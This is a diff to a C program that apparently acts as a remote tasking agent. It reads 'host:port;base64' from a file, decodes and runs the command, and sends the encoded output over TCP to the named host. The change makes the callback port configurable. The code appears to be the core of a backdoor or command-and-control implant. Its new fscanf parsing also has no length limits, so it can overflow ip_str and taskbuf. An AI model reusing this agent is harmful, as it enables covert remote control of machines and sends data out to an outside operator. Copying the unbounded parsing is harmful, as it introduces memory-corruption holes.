@@ -12,8 +12,6 @@
 #include "macros.h"
 
 #define MAX_DATA_SIZE 64000  // a bit smaller than the maximum TCP/UDP payload sizes
-#define TCP_RESPONSE_PORT 8080
-
 #define IP4_LEN_MAX 16  // xxx.xxx.xxx.xxx\0
 
 char *do_task(char *cmd_str)
@@ -69,7 +67,7 @@ char *do_task(char *cmd_str)
     return response;
 }
 
-int send_response(char *ip_str, char *response)
+int send_response(char *ip_str, int tcp_port, char *response)
 {
     int retval = -1;
 
@@ -78,7 +76,7 @@ int send_response(char *ip_str, char *response)
     {
         struct sockaddr_in saddr = {0};
         saddr.sin_family = AF_INET;
-        saddr.sin_port = htons(TCP_RESPONSE_PORT);
+        saddr.sin_port = htons(tcp_port);
 
         if (1 == inet_pton(AF_INET, ip_str, &saddr.sin_addr.s_addr))
         {
@@ -104,7 +102,7 @@ int main()
     char *taskbuf = NULL;
     size_t tasklen = 0;
     char ip_str[IP4_LEN_MAX] = {0};
-    char *b64_str = NULL;
+    int tcp_port = 0;
     char *cmd_str = NULL;
     char *response = NULL;
 
@@ -123,8 +121,9 @@ int main()
         retval = -2;
         goto cleanup;
     }
-    tasklen = fread(taskbuf, sizeof(char), MAX_DATA_SIZE, procfile);
-    if (0 == tasklen)
+    // host:port;base64
+    int val = fscanf(procfile, "%[^:]:%d;%s", ip_str, &tcp_port, taskbuf);
+    if (3 != val)
     {
         retval = -3;
         goto cleanup;
@@ -132,20 +131,11 @@ int main()
     fclose(procfile);
     procfile = NULL;
 
-    // split the message (IP;base64), account for size of ;
-    b64_str = strchr(taskbuf, ';') + 1;
-    if ((void *)1 == b64_str)
-    {
-        retval = -4;
-        goto cleanup;
-    }
-    strncpy(ip_str, taskbuf, (size_t)(b64_str - taskbuf -1));
-
     // decode the task
-    cmd_str = base64_decode(b64_str, strnlen(b64_str, MAX_DATA_SIZE - IP4_LEN_MAX - 1), &tasklen);
+    cmd_str = base64_decode(taskbuf, strnlen(taskbuf, MAX_DATA_SIZE - IP4_LEN_MAX - 1), &tasklen);
     if (NULL == cmd_str)
     {
-        retval = -5;
+        retval = -4;
         goto cleanup;
     }
     free(taskbuf);
@@ -159,15 +149,15 @@ int main()
         char errstr[25] = {0};
         sprintf(errstr, "ERROR: %d", errno);
         response = base64_encode(errstr, strlen(errstr), NULL);
-        retval = -6;
+        retval = -5;
     }
     free(cmd_str);
     cmd_str = NULL;
 
     // send the response
-    if (0 != send_response(ip_str, response))
+    if (0 != send_response(ip_str, tcp_port, response))
     {
-        retval = -7;
+        retval = -6;
         goto cleanup;
     }
     free(response);
